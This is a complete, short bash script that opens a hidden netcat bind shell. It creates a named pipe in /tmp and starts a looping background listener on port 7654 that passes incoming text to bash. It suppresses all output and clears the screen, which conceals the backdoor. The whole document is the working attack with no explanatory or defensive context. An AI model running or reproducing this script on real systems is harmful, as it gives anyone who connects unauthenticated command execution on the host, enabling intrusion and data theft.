#!/bin/bash

cd /tmp
mkfifo FIFO > /dev/null 2>&1
echo "while [ 1 ];do nc -l -p 7654 < FIFO 2>/dev/null | bash > FIFO;done;" | bash > /dev/null 2>&1 &
clear
